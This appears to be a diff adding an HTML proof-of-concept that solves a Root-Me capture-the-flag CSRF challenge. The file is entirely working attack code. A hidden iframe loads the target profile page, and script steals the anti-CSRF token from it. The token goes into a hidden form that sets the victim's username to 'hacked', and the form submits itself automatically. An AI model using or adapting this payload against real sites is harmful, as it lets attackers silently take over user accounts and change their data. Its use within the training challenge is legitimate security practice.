@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>RootMe CSRF - Contournement de jeton</title>
+</head>
+<body>
+  <h1>CSRF Token Bypass PoC</h1>
+  <!-- Iframe cachée pour récupérer le token -->
+  <iframe id="tokenFrame" src="http://challenge01.root-me.org/web-client/ch23/?action=profile" style="display:none;"></iframe>
+
+  <!-- Formulaire CSRF -->
+  <form id="csrfForm" action="http://challenge01.root-me.org/web-client/ch23/?action=profile" method="POST" enctype="multipart/form-data">
+    <input type="hidden" name="username" value="hacked" />
+    <input type="hidden" name="status" value="on" />
+    <input id="tokenInput" type="hidden" name="token" value="" />
+  </form>
+
+  <script>
+    // Attendre que l'iframe charge
+    document.getElementById("tokenFrame").onload = function() {
+      try {
+        const iframeDoc = this.contentDocument || this.contentWindow.document;
+        const token = iframeDoc.querySelector("input[name=token]").value;
+        console.log("Token récupéré :", token);
+
+        // Injecter le token dans le formulaire
+        document.getElementById("tokenInput").value = token;
+
+        // Soumettre le formulaire
+        document.getElementById("csrfForm").submit();
+        console.log("Formulaire soumis !");
+      } catch (e) {
+        console.error("Erreur :", e);
+      }
+    };
+  </script>
+</body>
+</html>
